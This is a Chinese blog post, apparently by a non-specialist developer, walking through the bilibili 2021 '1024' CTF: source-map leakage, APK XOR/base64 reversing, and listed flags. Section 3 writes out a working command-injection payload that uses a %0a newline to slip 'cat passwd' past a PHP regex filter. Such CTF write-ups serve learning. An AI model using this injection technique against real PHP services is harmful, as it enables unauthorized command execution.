---
title: "bilibli 2021 1024 CTF 解析"
date: 2021-10-23T14:22:39+08:00
draft: true
toc: true
comments: true
tags:
  - 安全
---

## 背景

2021 年 bilibili 搞了一次程序员节活动，第二部分为 7 道网络安全相关的题目，即 CTF 比赛。

作为一名后端开发（非安全专业），好奇尝试了一下。

活动网址为： https://www.bilibili.com/blackboard/20211024.html

CTF 网址为： https://security.bilibili.com/sec1024/ （活动后可能下线）

## 安全攻防--1

**未解出**

```
1024程序员节，大家一起和2233参与解密游戏吧~
happy_1024_2233:
e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf084d364
0408abca7deabb96a58f50471171b60e02b1a8dbd32db156
```

看起来像是 密码/编码相关，文本内容是 16 进制字符串，不是 base64，也不是 md5，暂时不知道怎么解。

另 [github](https://github.com/StackerDesu/bilibili_2021_1024/issues/1) 上搜到了第1题的答案：`a1cd5f84-27966146-3776f301-64031bb9`

## 安全攻防--2

**解出**

```
某高级前端开发攻城狮更改了一个前端配置项
https://security.bilibili.com/sec1024/q/
```

通过分析这个站点，可以出：

* 该站点是一个后台管理系统
* 该站点由三个页面组成，分别是用户信息页，用户列表页，访问日志页
* 每个有三个后端接口，其中 `user/info` 接口请求参数有 `token` 字段
* 经测试三个接口似乎没有 SQL 注入漏洞

以上没有得到什么启发，最后发现其前端资源里面包含了 source map，因此能直接浏览其前的前端代码。配合题目提示可以看出答案应该在源码里面。

从前端源码可以看出该项目是一个使用 vue 框架的前端项目。发现 `webpack:///src/views/home.vue` 路径下包含一个像 flag 的 token 注释。

其值为 `36c7a7b4-cda04af0-8db0368d-b5166480` 。提交后答案正确

## 安全攻防--3

**解出**

```
PHP is the best language for web programming, but what about other languages?
https://security.bilibili.com/sec1024/q/eval.zip
```

下载可以看到如下 php 代码（没学过）

```php
<?php
    /* 
        bilibili- ( ゜- ゜)つロ 乾杯~
        uat: http://192.168.3.2/uat/eval.php
        pro: http://security.bilibili.com/sec1024/q/pro/eval.php
    */
    $args = @$_GET['args'];
    if (count($args) >3) {
        exit();
    }
    for ( $i=0; $i<count($args); $i++ ){
        if ( !preg_match('/^\w+$/', $args[$i]) ) {
            exit();
        }
    }
    // todo: other filter
    $cmd = "/bin/2233 " . implode(" ", $args);
    exec($cmd, $out);
    for ($i=0; $i<count($out); $i++){
        echo($out[$i]);
        echo('<br>');
    }
?>
```

根据 [博客](https://blog.csdn.net/qq_20817327/article/details/77720823) 说明 `%0a` 可以绕过 PHP 的正则。

因此先执行一下 ls `curl --location -g --request GET 'http://security.bilibili.com/sec1024/q/pro/eval.php?args[]=a%0a&args[]=ls'` 输出如下

```html
1.txt<br>
                 passwd<br>
                 data<br>
                 config<br>
```

再执行一下 cat passwd `curl --location -g --request GET 'http://security.bilibili.com/sec1024/q/pro/eval.php?args[]=a%0a&args[]=cat&args[]=passwd'`

输出

```
9d3c3014-6c6267e7-086aaee5-1f18452a
```

提交后答案正确

另，感觉 `1.txt` 感觉不是无的放矢的。但是没有想到办法拿到。

## 安全攻防--4

**未解出**

```
懂的都懂
https://security.bilibili.com/sec1024/q/
```

改题和第二题站点相同，没有思路。

另 [github](https://github.com/StackerDesu/bilibili_2021_1024) 上搜到了第4题的答案：`3d5dd579-0678ef93-18b70cae-cabc5d51`

## 破解逆向--5

**解出**

```
安卓程序员小明学习了新的开发语言，兴奋地写了一个demo app
下载地址为：https://security.bilibili.com/sec1024/q/test.apk
```

首先安装了该 APK，发现该 APP 是个登录页面，需要输入用户名密码。

根据 [博客](https://www.jianshu.com/p/f8a06808f3ce) 说明，安装 dex2jar + JD-GUI 可以看到反编译的 Java 源码

`com.example.test/MainActivity.class`

```java
package com.example.test;

import android.content.Context;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.util.Arrays;

public class MainActivity extends AppCompatActivity {
  private static final String TAG = "MainActivity";
  
  Button btn;
  
  static {
    System.loadLibrary("Mylib");
  }
  
  public native String i();
  
  protected void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    setContentView(2131427356);
    Button button = (Button)findViewById(2131230803);
    this.btn = button;
    button.setOnClickListener(new View.OnClickListener() {
          public void onClick(View param1View) {
            EditText editText2 = (EditText)MainActivity.this.findViewById(2131230730);
            EditText editText1 = (EditText)MainActivity.this.findViewById(2131230731);
            String str2 = editText2.getText().toString();
            String str1 = editText1.getText().toString();
            byte[] arrayOfByte2 = Encrypt.b(Encrypt.a(str2.getBytes(), 3));
            byte[] arrayOfByte1 = Encrypt.b(Encrypt.a(str1.getBytes(), 3));
            if (Arrays.equals(arrayOfByte2, new byte[] { 
                  78, 106, 73, 49, 79, 122, 65, 51, 89, 71, 
                  65, 117, 78, 106, 78, 109, 78, 122, 99, 55, 
                  89, 109, 85, 61 }) && Arrays.equals(arrayOfByte1, new byte[] { 
                  89, 87, 66, 108, 79, 109, 90, 110, 78, 106, 
                  65, 117, 79, 109, 74, 109, 78, 122, 65, 120, 
                  79, 50, 89, 61 })) {
              Toast.makeText((Context)MainActivity.this, "bilibili- ( , 1).show();
              return;
            } 
            Toast.makeText((Context)MainActivity.this, ", 1).show();
          }
        });
  }
}
```

可以看出拿到两个输入框的输入内容，进行了一定的加密然后进行比较。关键在于 `Encrypt` 类

`com.example.test/Encrypt.class`

```java
package com.example.test;

import android.util.Base64;

public class Encrypt {
  public static byte[] a(byte[] paramArrayOfbyte, int paramInt) {
    if (paramArrayOfbyte == null || paramArrayOfbyte.length == 0)
      return null; 
    int j = paramArrayOfbyte.length;
    for (int i = 0; i < j; i++)
      paramArrayOfbyte[i] = (byte)(paramArrayOfbyte[i] ^ paramInt); 
    return paramArrayOfbyte;
  }
  
  public static byte[] b(byte[] paramArrayOfbyte) {
    return Base64.encode(paramArrayOfbyte, 2);
  }
}
```

该函数比较简单

* a 函数为对字节数组 `paramArrayOfbyte` 每字节异或 `paramInt`
* b 函数为简单的将 `paramArrayOfbyte` 做一下 base64 编码

因此只需要写一个逆向解密函数即可获得原始字符串

```java
package com.example;

import java.util.Base64;

public final class App {
    private App() {
    }
    public static void main(String[] args)  {
        byte[] a = new byte[] { 78, 106, 73, 49, 79, 122, 65, 51, 89, 71, 65, 117, 78, 106, 78, 109, 78, 122, 99, 55,
                89, 109, 85, 61 };

        byte[] b = new byte[] { 89, 87, 66, 108, 79, 109, 90, 110, 78, 106, 65, 117, 79, 109, 74, 109, 78, 122, 65, 120,
                79, 50, 89, 61 };

        System.out.println(decode(a, 3));
        System.out.println(decode(b, 3));
    }

    public static String decode(byte[] a, int paramInt)  {
        a = Base64.getDecoder().decode(a);

        for (int i = 0; i < a.length; i++)
            a[i] = (byte) (a[i] ^ paramInt);
        return new String(a);
    }
}
```

运行后结果为

```
516834cc-50e448af
bcf9ed53-9ae4328e
```

因此 flag 为 `516834cc-50e448af-bcf9ed53-9ae4328e` 提交后答案正确

## 破解逆向--6

**未解出**

```
安卓程序员小明学习了新的开发语言，兴奋地写了一个demo app
下载地址为：https://security.bilibili.com/sec1024/q/test.apk
```

本题和 破解逆向--5 题面完全相同。再观察反编译的源码发现，其载入了一个动态链接库 `System.loadLibrary("Mylib");`。

因此可能需要反编译该库。经搜索 IDA Pro 可以做到。但是由于该软件需要收费。暂且作罢。

另 [github](https://github.com/StackerDesu/bilibili_2021_1024/issues/2) 上搜到了第6题的答案：`b13981f4-5ae996d4-bc04be5b-34662a78`

## 风控--7

**未解出**

```
安全研究员小孙在早上的时候发现了一波异常流量在访问网站，他初步筛选了这些可疑的请求，请帮他找到所有的恶意 IP 。
flag 生成方式：找到所有的恶意 IP 后，通过通过英文逗号分隔成一个字符串后提交，系统会根据提交的 IP 正确数计算分数。
PS: 解题过程可发送至 security@bilibili.com, 标题: 1024-sec-r7-[你的 mid] 。我们会挑选3位，给予额外惊喜
日志下载； https://security.bilibili.com/sec1024/q7/evil-log.log.zip?v=2
```

下载了一下，该文件包含一个几百兆的日志文件，每行为一个 json object。一个例子如下：

```json
{
	"@timestamp": "2021-10-18T02:00:04+0000",
	"bytes_sent": "10346",
	"cdn_scheme": "https",
	"cookie_buvid": "-",
	"cookie_sid": "-",
	"cookie_userid": "-",
	"http_host": "www.bilibili.com",
	"http_path": "/s/video/BV1Jt4y1D7jJ",
	"http_referer": "\"-\"",
	"http_user_agent": "\"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\"",
	"request_length": "582",
	"request_time": "0.129",
	"scheme": "http",
	"server_name": "www.bilibili.com",
	"status": "200",
	"upstream_status": "200",
	"x_backend_bili_real_ip": "gg.cej.hd.bii"
}
```

不了解风控。尝试写了程序进行分析，也没有结论。
